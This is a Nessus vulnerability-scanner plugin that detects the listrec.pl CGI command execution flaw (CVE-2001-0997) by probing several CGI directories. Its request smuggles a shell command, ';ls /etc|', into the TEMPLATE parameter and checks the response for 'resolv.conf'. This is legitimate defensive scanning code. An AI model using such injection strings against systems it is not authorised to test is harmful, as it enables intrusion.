#
# This script written by Matt Moore <matt@westpoint.ltd.uk> 
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (12/30/10)

include("compat.inc");

if(description)
{
 script_id(10769);
 script_version ("$Revision: 1.24 $");
 script_cvs_date("$Date: 2016/11/23 20:31:33 $");

 script_cve_id("CVE-2001-0997");
 script_osvdb_id(640);
 
 script_name(english:"Textor Webmasters Ltd listrec.pl TEMPLATE Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitray commands may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The 'listrec.pl' cgi is installed. This CGI has a security flaw that 
lets an attacker execute arbitrary commands on the remote server, 
usually with the privileges of the web server." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin/common/." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"see_also", value:"http://www.textor.com/index.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securitytracker.com/alerts/2001/Sep/1002404.html" );


 script_set_attribute(attribute:"plugin_publication_date", value: "2001/09/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/09/11");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 summary["english"] = "Checks for the listrec.pl CGI";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Matt Moore ");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


dir[0] = "/cgi-bin/common";
dir[1] = "/cgi-local";
dir[2] = "/cgi_bin";
dir[3] = "";

 for(i=0; dir[i]; i = i + 1)
 {
 item = string(dir[i], "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res) {
  	 security_hole(port);
	 exit(0);
	}  
 }
 

foreach dir (cgi_dirs())
{
 item = string(dir, "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res =  http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res)security_hole(port);
}

